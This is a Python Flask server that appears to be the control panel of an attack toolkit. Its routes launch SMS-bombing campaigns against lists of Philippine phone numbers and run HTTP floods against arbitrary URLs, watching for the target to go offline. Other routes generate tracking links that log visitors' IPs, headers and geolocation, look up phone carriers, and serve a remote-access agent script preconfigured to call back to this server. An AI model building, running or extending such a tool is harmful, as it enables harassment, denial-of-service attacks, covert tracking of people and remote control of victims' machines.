from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from flask_socketio import SocketIO
import asyncio
import threading
from functools import wraps
from utils.config import config
from utils.logger import logger
from core.engine import Engine
from core.flood_engine import FloodEngine
from core.tracker import Tracker
from core.osint import OSINT
from core.remote_engine import RemoteEngine
from services.bomber_services import get_default_services
import re
import os
import gc

app = Flask(__name__)
app.secret_key = config.SESSION_SECRET
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# Global Engines and State
services = get_default_services()
bomber_engine = Engine(services)
flood_engine = FloodEngine()
tracker = Tracker()
osint_tool = OSINT()
remote_engine = RemoteEngine(socketio)

# Register Remote Handlers
remote_engine.register_handlers()

state = {
    "active": False,
    "type": None, # 'bomber' or 'flood'
    "success": 0,
    "failed": 0,
    "logs": [],
    "flood_requests": 0,
    "target_uptime": True,
    "lock": threading.Lock(),
    "global_hits": 0,
    "global_fails": 0,
    "total_targets": 0
}

def broadcast_stats():
    socketio.emit('live_stats', {
        "hits": state["global_hits"],
        "fails": state["global_fails"],
        "targets": state["total_targets"],
        "active": state["active"]
    })

@app.route('/')
def dashboard():
    return render_template('dashboard.html', services=services)

# --- DISPATCH SIGNAL (BOMBER) ---
@app.route('/dispatch/signal', methods=['POST'])
def start_signal():
    data = request.json
    phone_raw = data.get('phone', '')
    amount = int(data.get('amount', 100))
    selected_services = data.get('services')

    phones = [p.strip() for p in re.split(r'[,\n\r\s]+', phone_raw) if p.strip()]
    if not phones: return jsonify({"success": False, "error": "No targets"}), 400

    with state["lock"]:
        state["total_targets"] += len(phones)
    broadcast_stats()

    valid_phones = []
    for phone in phones:
        if re.match(r'^(09\d{9}|9\d{9}|\+639\d{9})$', phone.replace(' ', '')):
            valid_phones.append(phone)
    if not valid_phones: return jsonify({"success": False, "error": "Invalid format"}), 400

    with state["lock"]:
        if state["active"]: return jsonify({"success": False, "error": "Busy"}), 429
        state.update({"active": True, "type": "bomber", "success": 0, "failed": 0, "logs": []})

    def run_bomber():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def on_progress(batch, total, success, failed):
            with state["lock"]:
                state["success"] += success
                state["failed"] += failed
                state["global_hits"] += success
                state["global_fails"] += failed
                state["logs"].append({"msg": f"Dispatch Batch {batch}/{total}: {success} Hits", "type": "info"})
            broadcast_stats()

        try:
            loop.run_until_complete(bomber_engine.run_attack(valid_phones, amount, selected_services, on_progress))
        except Exception as e:
            with state["lock"]: state["logs"].append({"msg": f"Error: {str(e)}", "type": "error"})
        finally:
            with state["lock"]: state["active"] = False
            loop.close()
            gc.collect()

    threading.Thread(target=run_bomber).start()
    return jsonify({"success": True})

# --- NETWORK STRESS ANALYSIS (FLOOD) ---
@app.route('/analyze/stress', methods=['POST'])
def start_stress():
    data = request.json
    url = data.get('url', '')
    duration = int(data.get('duration', 60))
    concurrency = int(data.get('concurrency', 30))
    method = data.get('method', 'GET')

    if not url.startswith('http'): return jsonify({"success": False, "error": "Invalid URL"}), 400

    with state["lock"]:
        if state["active"]: return jsonify({"success": False, "error": "Busy"}), 429
        state.update({"active": True, "type": "flood", "flood_requests": 0, "target_uptime": True, "logs": []})

    def run_flood():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def on_progress(requests, uptime):
            with state["lock"]:
                state["flood_requests"] = requests
                state["target_uptime"] = uptime
                state["logs"].append({"msg": f"[{method}] Packets Sent: {requests} | Status: {'ONLINE' if uptime else 'OFFLINE'}", "type": "info"})

        try:
            loop.run_until_complete(flood_engine.run_flood(url, duration, concurrency, method, on_progress))
        except Exception as e:
            with state["lock"]: state["logs"].append({"msg": f"Error: {str(e)}", "type": "error"})
        finally:
            with state["lock"]: state["active"] = False
            loop.close()
            gc.collect()

    threading.Thread(target=run_flood).start()
    return jsonify({"success": True})

# --- STOP COMMAND ---
@app.route('/command/stop', methods=['POST'])
def stop_command():
    with state["lock"]:
        if not state["active"]: return jsonify({"success": False, "error": "Nothing running"})
        
        if state["type"] == "bomber":
            bomber_engine.stop()
        elif state["type"] == "flood":
            flood_engine.stop()
        
        state["logs"].append({"msg": "ABORT COMMAND RECEIVED", "type": "warning"})
    return jsonify({"success": True})

# --- STATUS ---
@app.route('/status')
def get_status():
    with state["lock"]:
        logs = state["logs"]
        state["logs"] = []
        return jsonify({
            "active": state["active"],
            "type": state["type"],
            "success": state["success"],
            "failed": state["failed"],
            "flood_requests": state["flood_requests"],
            "target_uptime": state["target_uptime"],
            "logs": logs
        })

# --- VERIFICATION SERVICE (TRACKER) ---
@app.route('/verify/generate', methods=['POST'])
def generate_link():
    target = request.json.get('target', 'https://google.com')
    link_id = tracker.generate_link(target)
    # Get current host
    host = request.host_url.rstrip('/')
    return jsonify({"link": f"{host}/v/{link_id}", "id": link_id})

@app.route('/v/<link_id>')
def track_and_redirect(link_id):
    # Capture multiple IPs from various headers used by proxies/CDNs
    forwarded = request.headers.get('X-Forwarded-For')
    real_ip = request.headers.get('X-Real-IP')
    cf_ip = request.headers.get('CF-Connecting-IP')
    
    ips = []
    if forwarded: ips.extend([x.strip() for x in forwarded.split(',')])
    if real_ip and real_ip not in ips: ips.append(real_ip)
    if cf_ip and cf_ip not in ips: ips.append(cf_ip)
    if not ips: ips.append(request.remote_addr)
    
    ip_str = ", ".join(ips)
    primary_ip = ips[0]
    
    client_data = {
        "ip": ip_str,
        "user_agent": request.user_agent.string,
        "referer": request.referrer,
        "headers": dict(request.headers),
        "geo": {}
    }
    
    # Enhanced GeoIP/ISP lookup
    import requests as sync_requests
    try:
        # Using a more detailed endpoint if possible, or sticking to ip-api
        resp = sync_requests.get(f"http://ip-api.com/json/{primary_ip}?fields=status,message,country,city,isp,as,mobile,proxy", timeout=2)
        if resp.status_code == 200:
            client_data["geo"] = resp.json()
    except:
        pass

    target_url = tracker.log_click(link_id, client_data)
    if target_url:
        return redirect(target_url)
    return "Invalid Link", 404

@app.route('/verify/logs/<link_id>')
def get_link_logs(link_id):
    data = tracker.get_link_data(link_id)
    if not data: return jsonify({"error": "Not found"}), 404
    return jsonify(data)

# --- INTELLIGENCE INQUIRY (OSINT) ---
@app.route('/inquiry/ip/<ip>')
def ip_inquiry(ip):
    # This is an async call in a sync route
    loop = asyncio.new_event_loop()
    res = loop.run_until_complete(osint_tool.ip_lookup(ip))
    loop.close()
    return jsonify(res)

@app.route('/inquiry/carrier/<phone>')
def carrier_inquiry(phone):
    loop = asyncio.new_event_loop()
    res = loop.run_until_complete(osint_tool.phone_carrier_lookup(phone, config.CARRIER_PREFIXES))
    loop.close()
    return jsonify(res)

@app.route('/health')
def health_check():
    return jsonify({"status": "active", "load": 0.1})

@app.route('/remote/clients')
def get_remote_clients():
    return jsonify(remote_engine.get_client_list())

# --- REMOTE ACCESS & API ---
@app.route('/api/stats')
def get_stats():
    return jsonify({
        "hits": state["global_hits"],
        "fails": state["global_fails"],
        "targets": state["total_targets"],
        "active_agents": len(remote_engine.agents)
    })

@app.route('/api/lookup/<phone>')
async def lookup_phone(phone):
    prefixes = {s.prefix: s.name for s in services if hasattr(s, 'prefix')}
    # Fallback prefixes for PH
    ph_prefixes = {
        "0917": "Globe", "0918": "Smart", "0919": "Smart", "0920": "Smart",
        "0921": "Smart", "0922": "Sun", "0923": "Sun", "0927": "Globe",
        "0937": "Globe", "0947": "Smart", "0966": "Globe", "0977": "Globe",
        "0998": "Smart", "0999": "Smart"
    }
    ph_prefixes.update(prefixes)
    res = await osint_tool.phone_carrier_lookup(phone, ph_prefixes)
    return jsonify(res)

@app.route('/remote/generate')
def generate_agent():
    # Inject current domain into agent.py for the user
    agent_path = os.path.join('client', 'agent.py')
    if not os.path.exists(agent_path):
        return "Agent source not found", 404
        
    with open(agent_path, 'r') as f:
        content = f.read()
    
    # Replace SERVER_URL placeholder with actual domain
    server_url = f"http://{request.host}"
    if request.is_secure or 'render.com' in request.host:
        server_url = f"https://{request.host}"
        
    content = content.replace('SERVER_URL = "http://localhost:5000"', f'SERVER_URL = "{server_url}"')
    
    return content, 200, {
        'Content-Type': 'text/x-python',
        'Content-Disposition': 'attachment; filename=agent_configured.py'
    }

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host='0.0.0.0', port=port, log_output=True)
